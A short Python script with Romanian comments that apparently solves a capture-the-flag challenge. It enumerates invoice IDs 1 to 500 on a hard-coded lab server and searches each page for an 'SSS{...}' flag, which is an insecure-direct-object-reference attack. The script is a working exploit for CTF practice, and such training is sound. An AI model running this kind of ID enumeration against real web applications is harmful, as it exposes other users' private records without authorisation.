import requests
import re

# URL-ul de baza fara numarul invoice-ului
base_url = "http://141.85.224.101:30019/invoice.php?invoice="

print("Incepem cautarea steagului...")

# Iteram prin primele 500 de ID-uri (poti mari numarul daca e nevoie)
for i in range(1, 501):
    url = f"{base_url}{i}"
    
    try:
        response = requests.get(url)
        
        # Cautam formatul SSS{ in textul raspunsului (codul sursa HTML)
        if "SSS{" in response.text:
            print(f"[+] Succes! Steagul a fost gasit la invoice #{i}")
            
            # Folosim putin Regex pentru a extrage exact steagul
            match = re.search(r"SSS\{.*?\}", response.text)
            if match:
                print(f"Steag: {match.group(0)}")
            break  # Ne oprim dupa ce l-am gasit
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Eroare la conexiunea pentru ID {i}")
